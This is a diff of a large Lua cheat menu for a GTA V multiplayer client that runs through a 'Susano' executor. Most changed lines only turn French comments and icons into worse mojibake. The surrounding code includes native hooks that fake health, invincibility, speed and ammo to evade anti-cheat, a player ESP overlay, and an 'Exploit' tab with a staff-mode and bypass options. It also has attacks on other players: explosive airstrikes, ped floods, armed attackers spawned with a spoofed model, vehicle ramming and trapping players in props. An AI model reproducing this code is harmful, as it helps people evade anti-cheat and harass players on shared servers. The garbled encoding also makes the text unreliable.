@@ -387,7 +387,7 @@ Menu.UpdatePlayerCount = function() end
 Menu.ShowSnowflakes = true -- sync avec Flocon value = true
 
 -- ============================================
--- DÃƒâ€°BUT DU CODE ORIGINAL (ligne 39 de l'ancien fichier)
+-- DÃƒÆ’Ã¢â‚¬Â°BUT DU CODE ORIGINAL (ligne 39 de l'ancien fichier)
 -- ============================================
 Menu.shooteyesEnabled = false
 Menu.magicbulletEnabled = false
@@ -407,8 +407,8 @@ Menu.WarpPressW = false
 -- ============================================
 -- STEALTH AUTO-SPOOF SYSTEM
 -- ============================================
--- Hooks enregistrÃ©s une seule fois. ConditionnÃ©s par flags.
--- Chaque feature toggle active/dÃ©sactive ses flags automatiquement.
+-- Hooks enregistrÃƒÂ©s une seule fois. ConditionnÃƒÂ©s par flags.
+-- Chaque feature toggle active/dÃƒÂ©sactive ses flags automatiquement.
 
 _Stealth = {
     invincible = false,
@@ -431,7 +431,7 @@ local _fakeAmmo = {}
 do
     if type(Susano) == "table" and type(Susano.HookNative) == "function" then
 
-        -- GetPlayerInvincible â†’ false
+        -- GetPlayerInvincible Ã¢â€ â€™ false
         Susano.HookNative(0xB721981B2B939E07, function(player)
             if _Stealth.invincible and player == PlayerId() then
                 return false, false
@@ -439,7 +439,7 @@ do
             return true
         end)
 
-        -- GetEntityHealth â†’ 190-200
+        -- GetEntityHealth Ã¢â€ â€™ 190-200
         Susano.HookNative(0xEEF059FAD016D209, function(entity)
             if _Stealth.health and entity == PlayerPedId() then
                 return false, 190 + math.random(0, 10)
@@ -447,7 +447,7 @@ do
             return true
         end)
 
-        -- GetPlayerStamina â†’ oscillation 45-98
+        -- GetPlayerStamina Ã¢â€ â€™ oscillation 45-98
         Susano.HookNative(0xCEFD02E1E6BC7AF0, function(player)
             if _Stealth.stamina and player == PlayerId() then
                 local now = GetGameTimer()
@@ -462,7 +462,7 @@ do
             return true
         end)
 
-        -- GetEntitySpeed â†’ cap 6.5-8.0 m/s
+        -- GetEntitySpeed Ã¢â€ â€™ cap 6.5-8.0 m/s
         Susano.HookNative(0xD5037BA82E12416F, function(entity)
             if _Stealth.speed then
                 local ped = PlayerPedId()
@@ -473,7 +473,7 @@ do
             return true
         end)
 
-        -- GetAmmoInPedWeapon â†’ fake count dÃ©croissant
+        -- GetAmmoInPedWeapon Ã¢â€ â€™ fake count dÃƒÂ©croissant
 
         -- GetWeaponDamageModifier: the real per-weapon modifier field is what
         -- the engine uses to scale melee damage; the script getter is only a
@@ -863,7 +863,7 @@ end
 
 Menu.Categories = {
     { name = "Main Menu", icon = "P" },
-    { name = "Player", iconUrl = "https://i.imgur.com/CI38tSd.png", icon = "Ã°Å¸â€˜Â¤", hasTabs = true, tabs = {
+    { name = "Player", iconUrl = "https://i.imgur.com/CI38tSd.png", icon = "ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â¤", hasTabs = true, tabs = {
         { name = "Self", items = {
             { name = "", isSeparator = true, separatorText = "Health" },
             { name = "Revive", type = "action" },
@@ -887,7 +887,7 @@ Menu.Categories = {
             { name = "Shoes", type = "selector", options = {}, selected = 1 }
         }}
     }},
-    { name = "Online", iconUrl = "https://i.imgur.com/9k1REcK.png", icon = "Ã°Å¸â€˜Â¥", hasTabs = true, tabs = {
+    { name = "Online", iconUrl = "https://i.imgur.com/9k1REcK.png", icon = "ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â¥", hasTabs = true, tabs = {
         { name = "Player List", items = {
             { name = "Loading players...", type = "action" }
         }},
@@ -968,7 +968,7 @@ Menu.Categories = {
             { name = "Give", type = "selector", options = {"Vehicle", "Ramp", "Wall", "Wall 2"}, selected = 1 }
         }}
     }},
-    { name = "Visual", iconUrl = "https://i.imgur.com/iHvywcn.png", icon = "Ã°Å¸â€˜Â", hasTabs = true, tabs = {
+    { name = "Visual", iconUrl = "https://i.imgur.com/iHvywcn.png", icon = "ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â", hasTabs = true, tabs = {
         { name = "World", items = {
             { name = "FPS Boost", type = "toggle", value = false },
             { name = "Time", type = "slider", value = 12.0, min = 0.0, max = 23.0 },
@@ -982,7 +982,7 @@ Menu.Categories = {
             { name = "FOV", type = "selector", options = {"Normal", "60", "70", "80", "90", "100", "110", "120"}, selected = 1 }
         }}
     }},
-    { name = "Combat", iconUrl = "https://i.imgur.com/zeRlEgV.png", icon = "Ã°Å¸â€Â«", hasTabs = true, tabs = {
+    { name = "Combat", iconUrl = "https://i.imgur.com/zeRlEgV.png", icon = "ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â«", hasTabs = true, tabs = {
         { name = "General", items = {
             { name = "Attach Target (H)", type = "toggle", value = false, onClick = function(val) ToggleAttachTarget(val) end },
             { name = "", isSeparator = true, separatorText = "Weapon Mods" },
@@ -1018,7 +1018,7 @@ Menu.Categories = {
             { name = "weapon_hk_ump", type = "action" }
         }}
     }},
-    { name = "Vehicle", iconUrl = "https://i.imgur.com/DkzEgPb.png", icon = "Ã°Å¸Å¡â€”", hasTabs = true, tabs = {
+    { name = "Vehicle", iconUrl = "https://i.imgur.com/DkzEgPb.png", icon = "ÃƒÂ°Ã…Â¸Ã…Â¡Ã¢â‚¬â€", hasTabs = true, tabs = {
         { name = "Performance", items = {
             { name = "", isSeparator = true, separatorText = "Warp" },
             { name = "FOV Warp", type = "toggle", value = false, onClick = function(val) Menu.FOVWarp = val end },
@@ -1197,7 +1197,7 @@ Menu.Categories = {
             end }
         }}
     }},
-    { name = "Exploit", iconUrl = "https://i.imgur.com/G4seAMg.png", icon = "ðŸ’€", hasTabs = true, tabs = {
+    { name = "Exploit", iconUrl = "https://i.imgur.com/G4seAMg.png", icon = "Ã°Å¸â€™â‚¬", hasTabs = true, tabs = {
         { name = "Exploits", items = {
             { name = "", isSeparator = true, separatorText = "Server" },
             { name = "Staff Mode", type = "toggle", value = false, dynasty = true},
@@ -1219,7 +1219,7 @@ Menu.Categories = {
             { name = "Bypass Putin", type = "action", dynasty = true },
         }}
     }},
-    { name = "Settings", iconUrl = "https://i.imgur.com/FQsvrIJ.png", icon = "Ã¢Å¡â„¢", hasTabs = true, tabs = {
+    { name = "Settings", iconUrl = "https://i.imgur.com/FQsvrIJ.png", icon = "ÃƒÂ¢Ã…Â¡Ã¢â€žÂ¢", hasTabs = true, tabs = {
         { name = "General", items = {
             { name = "Editor Mode", type = "toggle", value = false },
             { name = "Menu Size", type = "slider", value = 110.0, min = 50.0, max = 200.0, step = 1.0 },
@@ -1231,7 +1231,7 @@ Menu.Categories = {
     }}
 }
 
--- Appliquer le thÃ¨me vert par dÃ©faut au dÃ©marrage
+-- Appliquer le thÃƒÂ¨me vert par dÃƒÂ©faut au dÃƒÂ©marrage
 if Menu.ApplyTheme then
     Menu.ApplyTheme("Green")
 end
@@ -1410,7 +1410,7 @@ local espSettings = nil
 -- ESP Cache pour optimisation
 local ESPCache = {}
 local ESPCacheTime = 0
-local ESPCacheMaxAge = 0.016 -- 1 frame ÃƒÂ  60fps
+local ESPCacheMaxAge = 0.016 -- 1 frame ÃƒÆ’Ã‚Â  60fps
 
 local function GetScreenSize()
     if Susano and Susano.GetScreenWidth and Susano.GetScreenHeight then
@@ -2020,10 +2020,10 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
     local targetPos = GetEntityCoords(targetPed)
     local dist = #(myPos - targetPos)
     
-    -- Optimisation: vÃƒÂ©rifier la distance avant les calculs coÃƒÂ»teux
+    -- Optimisation: vÃƒÆ’Ã‚Â©rifier la distance avant les calculs coÃƒÆ’Ã‚Â»teux
     if dist > 100.0 then return end
     
-    -- Cache pour ÃƒÂ©viter les recalculs frÃƒÂ©quents
+    -- Cache pour ÃƒÆ’Ã‚Â©viter les recalculs frÃƒÆ’Ã‚Â©quents
     local cacheKey = tostring(targetPed) .. "_" .. tostring(playerIdx)
     local currentTime = GetGameTimer() or 0
     local cached = ESPCache[cacheKey]
@@ -2084,14 +2084,14 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
         local textColor = ESPColors[1]
         if settings["Text Color"] then textColor = ESPColors[settings["Text Color"].selected] or textColor end
 
-        -- Skeleton (optimisÃƒÂ© avec cache des os)
+        -- Skeleton (optimisÃƒÆ’Ã‚Â© avec cache des os)
         if drawSkeleton then
             local boneCache = {}
             for _, connection in ipairs(SkeletonConnections) do
                 local bone1 = connection[1]
                 local bone2 = connection[2]
                 
-                -- Cache des positions des os pour ÃƒÂ©viter les appels rÃƒÂ©pÃƒÂ©tÃƒÂ©s
+                -- Cache des positions des os pour ÃƒÆ’Ã‚Â©viter les appels rÃƒÆ’Ã‚Â©pÃƒÆ’Ã‚Â©tÃƒÆ’Ã‚Â©s
                 local pos1 = boneCache[bone1]
                 if not pos1 then
                     pos1 = GetPedBoneCoords(targetPed, bone1, 0.0, 0.0, 0.0)
@@ -2107,7 +2107,7 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
                 local os1, x1, y1 = GetScreenCoordFromWorldCoord(pos1.x, pos1.y, pos1.z)
                 local os2, x2, y2 = GetScreenCoordFromWorldCoord(pos2.x, pos2.y, pos2.z)
 
-                -- Optimisation: vÃƒÂ©rifier que les coordonnÃƒÂ©es sont valides et dans l'ÃƒÂ©cran
+                -- Optimisation: vÃƒÆ’Ã‚Â©rifier que les coordonnÃƒÆ’Ã‚Â©es sont valides et dans l'ÃƒÆ’Ã‚Â©cran
                 if os1 and os2 and x1 and y1 and x2 and y2 and 
                    x1 >= 0 and x1 <= 1 and y1 >= 0 and y1 <= 1 and
                    x2 >= 0 and x2 <= 1 and y2 >= 0 and y2 <= 1 and
@@ -2120,7 +2120,7 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
             end
         end
         
-        -- Calculate 2D Box & Info Positions (optimisÃƒÂ© avec cache)
+        -- Calculate 2D Box & Info Positions (optimisÃƒÆ’Ã‚Â© avec cache)
         local headPos = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
         local footPos = GetEntityCoords(targetPed)
         footPos = vector3(footPos.x, footPos.y, footPos.z - 1.0) -- Adjust for bottom
@@ -2150,11 +2150,11 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
             ESPCache[footCacheKey] = {x = footX, y = footY, time = currentTime}
         end
         
-        -- VÃƒÂ©rifier que les coordonnÃƒÂ©es sont valides avant de calculer la box
+        -- VÃƒÆ’Ã‚Â©rifier que les coordonnÃƒÆ’Ã‚Â©es sont valides avant de calculer la box
         if not headX or not headY or not footX or not footY then return end
         
         local height = math.abs(headY - footY)
-        if height < 0.01 then return end -- Ãƒâ€°viter les boxes trop petites
+        if height < 0.01 then return end -- ÃƒÆ’Ã¢â‚¬Â°viter les boxes trop petites
         
         local width = height * 0.35 -- Thinner box (was 0.5)
         
@@ -2166,7 +2166,7 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
         -- Fix Y order if inverted
         if boxY1 > boxY2 then boxY1, boxY2 = boxY2, boxY1 end
 
-        -- Box (optimisÃƒÂ© - vÃƒÂ©rifier que la box est valide)
+        -- Box (optimisÃƒÆ’Ã‚Â© - vÃƒÆ’Ã‚Â©rifier que la box est valide)
         if drawBox and boxX1 and boxX2 and boxY1 and boxY2 then
             -- Draw thin black outline
             Draw2DBox(boxX1 - 0.0005, boxY1 - 0.0005, boxX2 + 0.0005, boxY2 + 0.0005, 0.0, 0.0, 0.0, 1.0, screenW, screenH)
@@ -2174,7 +2174,7 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
             Draw2DBox(boxX1, boxY1, boxX2, boxY2, boxColor[1], boxColor[2], boxColor[3], 1.0, screenW, screenH)
         end
         
-        -- Snapline (optimisÃƒÂ© - vÃƒÂ©rifier que footX et footY sont valides)
+        -- Snapline (optimisÃƒÆ’Ã‚Â© - vÃƒÆ’Ã‚Â©rifier que footX et footY sont valides)
         if drawLine and Susano.DrawLine and footX and footY then
              Susano.DrawLine(screenW / 2, screenH, footX * screenW, footY * screenH, lineColor[1], lineColor[2], lineColor[3], 1.0, 1)
         end
@@ -2195,7 +2195,7 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
         if drawWeapon then
              local _, weaponHash = GetCurrentPedWeapon(targetPed, true)
              local weaponName = GetWeaponNameFromHash(weaponHash)
-             -- GetWeaponNameFromHash retourne dÃƒÂ©jÃƒÂ  "Unarmed" pour WEAPON_UNARMED
+             -- GetWeaponNameFromHash retourne dÃƒÆ’Ã‚Â©jÃƒÆ’Ã‚Â  "Unarmed" pour WEAPON_UNARMED
              AddToBucket(drawWeaponPos + 1, weaponName)
         end
         
@@ -2243,7 +2243,7 @@ local function RenderPedESP(targetPed, playerIdx, settings, screenW, screenH, my
             end
         end
         
-        -- Health & Armor Bars (optimisÃƒÂ© - vÃƒÂ©rifier que la box est valide)
+        -- Health & Armor Bars (optimisÃƒÆ’Ã‚Â© - vÃƒÆ’Ã‚Â©rifier que la box est valide)
         if (drawHealth or drawArmor) and boxX1 and boxY1 and boxY2 then
             local barW = 2 -- Thinner bar
             
@@ -5694,7 +5694,7 @@ end
 
 function Menu.ActionChangePlate()
     if Menu and Menu.OpenInput then
-        Menu.OpenInput("Change Plate", "Entrez le texte de la plaque (max 8 caractÃƒÂ¨res):", function(input)
+        Menu.OpenInput("Change Plate", "Entrez le texte de la plaque (max 8 caractÃƒÆ’Ã‚Â¨res):", function(input)
             if input and input ~= "" then
                 local plateText = string.sub(input, 1, 8)
                 local playerPed = PlayerPedId()
@@ -10956,7 +10956,7 @@ end
                                     local playerPed = PlayerPedId()
                                     local myCoords = GetEntityCoords(playerPed)
                                     
-                                    -- Trouver le vÃƒÂ©hicule le plus proche
+                                    -- Trouver le vÃƒÆ’Ã‚Â©hicule le plus proche
                                     local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)
                                     if not closestVeh or closestVeh == 0 then return end
                                     
@@ -10964,7 +10964,7 @@ end
                                     local savedCoords = GetEntityCoords(playerPed)
                                     local savedHeading = GetEntityHeading(playerPed)
                                     
-                                    -- Obtenir le contrÃƒÂ´le du vÃƒÂ©hicule
+                                    -- Obtenir le contrÃƒÆ’Ã‚Â´le du vÃƒÆ’Ã‚Â©hicule
                                     SetEntityAsMissionEntity(closestVeh, true, true)
                                     local timeout = 1000
                                     NetworkRequestControlOfEntity(closestVeh)
@@ -10974,16 +10974,16 @@ end
                                         NetworkRequestControlOfEntity(closestVeh)
                                     end
                                     
-                                    -- Me tÃƒÂ©lÃƒÂ©porter dans le vÃƒÂ©hicule
+                                    -- Me tÃƒÆ’Ã‚Â©lÃƒÆ’Ã‚Â©porter dans le vÃƒÆ’Ã‚Â©hicule
                                     SetPedIntoVehicle(playerPed, closestVeh, -1)
                                     Wait(100)
                                     
-                                    -- Me remettre ÃƒÂ  ma position originale
+                                    -- Me remettre ÃƒÆ’Ã‚Â  ma position originale
                                     SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
                                     SetEntityHeading(playerPed, savedHeading)
                                     Wait(50)
                                     
-                                    -- Positionner le vÃƒÂ©hicule derriÃƒÂ¨re le joueur cible (comme dans Luxor)
+                                    -- Positionner le vÃƒÆ’Ã‚Â©hicule derriÃƒÆ’Ã‚Â¨re le joueur cible (comme dans Luxor)
                                     local targetCoords = GetEntityCoords(ped)
                                     local spawnPos = GetOffsetFromEntityInWorldCoords(ped, 0.0, -10.0, 0.0)
                                     local heading = GetEntityHeading(ped)
@@ -10991,13 +10991,13 @@ end
                                     SetEntityCoordsNoOffset(closestVeh, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
                                     SetEntityHeading(closestVeh, heading)
                                     
-                                    -- Configurer le vÃƒÂ©hicule pour le ram
+                                    -- Configurer le vÃƒÆ’Ã‚Â©hicule pour le ram
                                     SetVehicleForwardSpeed(closestVeh, 100.0)
                                     SetEntityVisible(closestVeh, true, false)
                                     SetVehicleDoorsLocked(closestVeh, 4)
                                     SetVehicleEngineOn(closestVeh, true, true, false)
                                     
-                                    -- Nettoyage automatique aprÃƒÂ¨s 15 secondes
+                                    -- Nettoyage automatique aprÃƒÆ’Ã‚Â¨s 15 secondes
                                     Citizen.SetTimeout(15000, function()
                                         if DoesEntityExist(closestVeh) then
                                             DeleteVehicle(closestVeh)
@@ -11138,14 +11138,14 @@ function Menu.ActionDropVehicle()
 end
 
 -- Airstrike : Volatus en feu sur la cible
--- Cooldown global pour Ã©viter le spam InjectResource
+-- Cooldown global pour ÃƒÂ©viter le spam InjectResource
 _G._airstrikeLastUse = 0
 _G._airstrikeCD = 5000 -- 5s entre chaque
 
 function Menu.ActionAirstrike()
     if not Menu.SelectedPlayer then return end
 
-    -- Cooldown check (cÃ´tÃ© overlay)
+    -- Cooldown check (cÃƒÂ´tÃƒÂ© overlay)
     local now = GetGameTimer()
     if now - (_G._airstrikeLastUse or 0) < _G._airstrikeCD then return end
     _G._airstrikeLastUse = now
@@ -11205,14 +11205,14 @@ function Menu.ActionAirstrike()
                 SetEntityAsMissionEntity(heli, true, true)
                 SetEntityRotation(heli, -70.0, 0.0, math.random(0, 360) + 0.0, 2, true)
 
-                -- NE PAS tuer le vÃ©hicule immÃ©diatement
-                -- On dÃ©grade progressivement pour que RAGE ne le GC pas
+                -- NE PAS tuer le vÃƒÂ©hicule immÃƒÂ©diatement
+                -- On dÃƒÂ©grade progressivement pour que RAGE ne le GC pas
                 SetVehicleEngineHealth(heli, 100.0)
                 SetVehicleBodyHealth(heli, 200.0)
-                -- VÃ©locitÃ© de chute
+                -- VÃƒÂ©locitÃƒÂ© de chute
                 SetEntityVelocity(heli, 0.0, 0.0, -35.0)
 
-                -- Thread fumÃ©e/feu progressif pendant la chute
+                -- Thread fumÃƒÂ©e/feu progressif pendant la chute
                 CreateThread(function()
                     Wait(300)
                     if DoesEntityExist(heli) then
@@ -11225,9 +11225,9 @@ function Menu.ActionAirstrike()
                     end
                 end)
 
-                -- Thread principal : tracking altitude â†’ explosion
+                -- Thread principal : tracking altitude Ã¢â€ â€™ explosion
                 local exploded = false
-                local timeout = 100 -- 5s max (100 Ã— 50ms)
+                local timeout = 100 -- 5s max (100 Ãƒâ€” 50ms)
                 while timeout > 0 and not exploded and rawget(_G, '_airstrike_active') do
                     Wait(50)
                     timeout = timeout - 1
@@ -11235,15 +11235,15 @@ function Menu.ActionAirstrike()
                     if not DoesEntityExist(heli) then break end
 
                     local heliCoords = GetEntityCoords(heli)
-                    -- Maintenir la vÃ©locitÃ© de chute (RAGE ralentit les Ã©paves)
+                    -- Maintenir la vÃƒÂ©locitÃƒÂ© de chute (RAGE ralentit les ÃƒÂ©paves)
                     SetEntityVelocity(heli, 0.0, 0.0, -35.0)
 
-                    -- Quand l'heli est Ã  ~12m de la cible
+                    -- Quand l'heli est ÃƒÂ  ~12m de la cible
                     if heliCoords.z <= tc.z + 12.0 then
                         -- Impact principal
                         AddExplosion(heliCoords.x, heliCoords.y, heliCoords.z, 7, 5.0, true, false, 1.0)
                         Wait(50)
-                        -- Secondaires dÃ©calÃ©es
+                        -- Secondaires dÃƒÂ©calÃƒÂ©es
                         for i = 1, 3 do
                             local ox = math.random(-3, 3) + 0.0
                             local oy = math.random(-3, 3) + 0.0
@@ -11263,13 +11263,13 @@ function Menu.ActionAirstrike()
                     end
                 end
 
-                -- Timeout sans impact â†’ forcer explosion
+                -- Timeout sans impact Ã¢â€ â€™ forcer explosion
                 if not exploded and DoesEntityExist(heli) then
                     local ec = GetEntityCoords(heli)
                     AddExplosion(ec.x, ec.y, ec.z, 7, 5.0, true, false, 1.0)
                 end
 
-                -- Cleanup entitÃ© aprÃ¨s un dÃ©lai (laisser le temps au FX)
+                -- Cleanup entitÃƒÂ© aprÃƒÂ¨s un dÃƒÂ©lai (laisser le temps au FX)
                 Wait(2000)
                 if DoesEntityExist(heli) then
                     SetEntityAsMissionEntity(heli, true, true)
@@ -12595,7 +12595,7 @@ end
                         end
                     end
 
--- Teleport Into : warp dans le vÃ©hicule de la cible comme passager
+-- Teleport Into : warp dans le vÃƒÂ©hicule de la cible comme passager
 function Menu.ActionTeleportInto()
     if not Menu.SelectedPlayer then return end
     local targetServerId = Menu.SelectedPlayer
@@ -12618,7 +12618,7 @@ function Menu.ActionTeleportInto()
 
             local targetVeh = GetVehiclePedIsIn(targetPed, false)
             if not targetVeh or targetVeh == 0 then
-                -- Pas en vÃ©hicule : TP directement Ã  cÃ´tÃ©
+                -- Pas en vÃƒÂ©hicule : TP directement ÃƒÂ  cÃƒÂ´tÃƒÂ©
                 local tc = GetEntityCoords(targetPed)
                 SetEntityCoordsNoOffset(PlayerPedId(), tc.x + 1.0, tc.y, tc.z, false, false, false)
                 return
@@ -12626,7 +12626,7 @@ function Menu.ActionTeleportInto()
 
             local playerPed = PlayerPedId()
 
-            -- Chercher un siÃ¨ge libre (-1=driver, 0=passager avant, 1-2=arriÃ¨re)
+            -- Chercher un siÃƒÂ¨ge libre (-1=driver, 0=passager avant, 1-2=arriÃƒÂ¨re)
             local seatFound = nil
             for seat = 0, GetVehicleMaxNumberOfPassengers(targetVeh) - 1 do
                 if IsVehicleSeatFree(targetVeh, seat) then
@@ -12636,7 +12636,7 @@ function Menu.ActionTeleportInto()
             end
 
             if not seatFound then
-                -- Aucun siÃ¨ge libre : Ã©jecter le passager du siÃ¨ge 0
+                -- Aucun siÃƒÂ¨ge libre : ÃƒÂ©jecter le passager du siÃƒÂ¨ge 0
                 local passengerPed = GetPedInVehicleSeat(targetVeh, 0)
                 if passengerPed and passengerPed ~= 0 and DoesEntityExist(passengerPed) then
                     TaskLeaveVehicle(passengerPed, targetVeh, 16)
@@ -12645,7 +12645,7 @@ function Menu.ActionTeleportInto()
                 seatFound = 0
             end
 
-            -- TP au vÃ©hicule puis warp dans le siÃ¨ge
+            -- TP au vÃƒÂ©hicule puis warp dans le siÃƒÂ¨ge
             local vc = GetEntityCoords(targetVeh)
             SetEntityCoordsNoOffset(playerPed, vc.x, vc.y, vc.z, false, false, false)
             Wait(100)
@@ -13397,7 +13397,7 @@ function Menu.ActionPedFlood()
                             local x = tc.x + math.cos(angle) * radius
                             local y = tc.y + math.sin(angle) * radius
 
-                            -- Ground Z check : Ã©vite spawn sous la map
+                            -- Ground Z check : ÃƒÂ©vite spawn sous la map
                             local foundGround, groundZ = GetGroundZFor_3dCoord(x, y, tc.z + 5.0, false)
                             local z = foundGround and groundZ or tc.z
 
@@ -13425,7 +13425,7 @@ function Menu.ActionPedFlood()
                                 totalFailed = totalFailed + 1
                             end
 
-                            -- Yield aprÃ¨s chaque ped (anti script-hang)
+                            -- Yield aprÃƒÂ¨s chaque ped (anti script-hang)
                             Wait(10)
                         end
 
@@ -13488,7 +13488,7 @@ if Actions.pedFloodItem then
     end
 end
 
--- Ped Armed : spawn un ped armÃ© d'un fusil Ã  pompe sur la cible
+-- Ped Armed : spawn un ped armÃƒÂ© d'un fusil ÃƒÂ  pompe sur la cible
 -- Ragdoll : force le ragdoll sur la cible via Susano.RequestRagdoll
 function Menu.ActionRagdoll()
     if not Menu.SelectedPlayer then return end
@@ -13525,21 +13525,21 @@ function Menu.ActionPedArmed()
             if not DoesEntityExist(targetPed) then return end
             local tc = GetEntityCoords(targetPed)
 
-            -- Spoof en clown cÃ´tÃ© serveur
+            -- Spoof en clown cÃƒÂ´tÃƒÂ© serveur
             local clownHash = 0x3C438FD2 -- s_m_y_clown_01
             RequestModel(clownHash)
             local tw = 50
             while not HasModelLoaded(clownHash) and tw > 0 do Wait(10); tw = tw - 1 end
             Susano.SpoofPed(clownHash, true)
 
-            -- ModÃ¨le rÃ©el : civil basique (discret)
+            -- ModÃƒÂ¨le rÃƒÂ©el : civil basique (discret)
             local modelHash = GetHashKey("a_m_m_hillbilly_01")
             RequestModel(modelHash)
             local t = 50
             while not HasModelLoaded(modelHash) and t > 0 do Wait(10); t = t - 1 end
             if not HasModelLoaded(modelHash) then Susano.SpoofPed(0, false) return end
 
-            -- Spawn juste derriÃ¨re la cible (1.5m)
+            -- Spawn juste derriÃƒÂ¨re la cible (1.5m)
             local heading = GetEntityHeading(targetPed)
             local rad = math.rad(heading)
             local x = tc.x - math.sin(rad) * 1.5
@@ -13556,13 +13556,13 @@ function Menu.ActionPedArmed()
                 SetPedFleeAttributes(ped, 0, false)
                 SetBlockingOfNonTemporaryEvents(ped, true)
                 SetPedKeepTask(ped, true)
-                -- Fusil Ã  pompe
+                -- Fusil ÃƒÂ  pompe
                 GiveWeaponToPed(ped, 0x1D073A89, 250, false, true) -- WEAPON_PUMPSHOTGUN
-                -- Tir immÃ©diat sur la cible
+                -- Tir immÃƒÂ©diat sur la cible
                 TaskCombatPed(ped, targetPed, 0, 16)
             end
 
-            -- DÃ©sactiver le spoof aprÃ¨s spawn
+            -- DÃƒÂ©sactiver le spoof aprÃƒÂ¨s spawn
             Wait(500)
             Susano.SpoofPed(0, false)
 
@@ -14932,7 +14932,7 @@ _G._buggyRampHandles = _G._buggyRampHandles or {}
 _G._buggyRampVeh = nil
 _G._buggyRampThread = false
 _G._buggyRampForceThread = false
-_G._buggyRampCooldowns = {} -- anti-spam : 1 force par vÃ©hicule
+_G._buggyRampCooldowns = {} -- anti-spam : 1 force par vÃƒÂ©hicule
 
 local RAMP_MODEL_PRIMARY  = "prop_mp_ramp_01"
 local RAMP_MODEL_FALLBACK = "lts_prop_lts_ramp_01"
@@ -15067,7 +15067,7 @@ function Menu.StartAssaultDriver(attackerPed, attackerVeh, targetPed)
     SetEntityInvincible(attackerPed, true)
     SetEntityInvincible(attackerVeh, true)
 
-    -- Armer le ped pour le mode combat vÃ©hicule
+    -- Armer le ped pour le mode combat vÃƒÂ©hicule
     GiveWeaponToPed(attackerPed, GetHashKey("WEAPON_MICROSMG"), 9999, false, true)
 
     _G._assaultDriverActive = true
@@ -15082,19 +15082,19 @@ function Menu.StartAssaultDriver(attackerPed, attackerVeh, targetPed)
                 break
             end
 
-            -- Re-place le driver si Ã©jectÃ©
+            -- Re-place le driver si ÃƒÂ©jectÃƒÂ©
             if not IsPedInVehicle(attackerPed, attackerVeh, false) then
                 SetPedIntoVehicle(attackerPed, attackerVeh, -1)
                 Citizen.Wait(100)
             end
 
-            -- DÃ©tection : cible Ã  pied ou en vÃ©hicule ?
+            -- DÃƒÂ©tection : cible ÃƒÂ  pied ou en vÃƒÂ©hicule ?
             local targetVeh = GetVehiclePedIsIn(targetPed, false)
             local targetInVehicle = targetVeh ~= 0 and DoesEntityExist(targetVeh)
 
             if not targetInVehicle then
-                -- === MODE CARKILL : cible Ã  pied ===
-                -- TaskVehicleMissionPedTarget = foncer sur le ped pour l'Ã©craser
+                -- === MODE CARKILL : cible ÃƒÂ  pied ===
+                -- TaskVehicleMissionPedTarget = foncer sur le ped pour l'ÃƒÂ©craser
                 if lastMode ~= "carkill" then
                     ClearPedTasks(attackerPed)
                     Citizen.Wait(50)
@@ -15115,7 +15115,7 @@ function Menu.StartAssaultDriver(attackerPed, attackerVeh, targetPed)
                     true            -- DriveAgainstTraffic
                 )
             else
-                -- === MODE CHASE : cible en vÃ©hicule ===
+                -- === MODE CHASE : cible en vÃƒÂ©hicule ===
                 -- Poursuite + tir drive-by
                 if lastMode ~= "chase" then
                     ClearPedTasks(attackerPed)
@@ -15200,7 +15200,7 @@ function Menu.ActionAssaultDriver()
         return
     end
 
-    -- Spawn 30m derriÃ¨re la cible
+    -- Spawn 30m derriÃƒÂ¨re la cible
     local fwd = GetEntityForwardVector(targetPed)
     local spawnX = tc.x - fwd.x * 30.0
     local spawnY = tc.y - fwd.y * 30.0
@@ -15276,7 +15276,7 @@ local function ResolveTargetCoords()
     return targetPed, GetEntityCoords(targetPed)
 end
 
--- Spawn un prop sur la position d'un joueur ciblÃ©
+-- Spawn un prop sur la position d'un joueur ciblÃƒÂ©
 local function SpawnTubeProp(model, coords, heading)
     local hash = GetHashKey(model)
     RequestModel(hash)
@@ -15303,7 +15303,7 @@ local function SpawnTubeProp(model, coords, heading)
     return 0
 end
 
--- Rainbow Tube : ar_prop_ar_tube_crn_5d sur la position du joueur ciblÃ©
+-- Rainbow Tube : ar_prop_ar_tube_crn_5d sur la position du joueur ciblÃƒÂ©
 function Menu.ActionRainbowTube()
     local targetPed, tc = ResolveTargetCoords()
     if not tc then
@@ -15317,8 +15317,8 @@ function Menu.ActionRainbowTube()
     end
 end
 
--- Trapped in Tube : stt_prop_stunt_tube_l centrÃ© sur le joueur
--- Le tube est posÃ© de faÃ§on Ã  enfermer le joueur dedans (rotation 90Â° pour Ãªtre vertical/horizontal)
+-- Trapped in Tube : stt_prop_stunt_tube_l centrÃƒÂ© sur le joueur
+-- Le tube est posÃƒÂ© de faÃƒÂ§on ÃƒÂ  enfermer le joueur dedans (rotation 90Ã‚Â° pour ÃƒÂªtre vertical/horizontal)
 function Menu.ActionTrappedInTube()
     local targetPed, tc = ResolveTargetCoords()
     if not tc then
@@ -15338,7 +15338,7 @@ function Menu.ActionTrappedInTube()
     if obj and obj ~= 0 and DoesEntityExist(obj) then
         SetEntityAsMissionEntity(obj, true, true)
         NetworkRegisterEntityAsNetworked(obj)
-        -- Rotation X=90Â° : tube posÃ© Ã  l'horizontale autour du joueur
+        -- Rotation X=90Ã‚Â° : tube posÃƒÂ© ÃƒÂ  l'horizontale autour du joueur
         SetEntityRotation(obj, 90.0, 0.0, GetEntityHeading(targetPed), 2, true)
         FreezeEntityPosition(obj, true)
         SetEntityCollision(obj, true, true)
@@ -15431,20 +15431,20 @@ function Menu.ActionAttachToilet()
     SetEntityAsMissionEntity(obj, true, true)
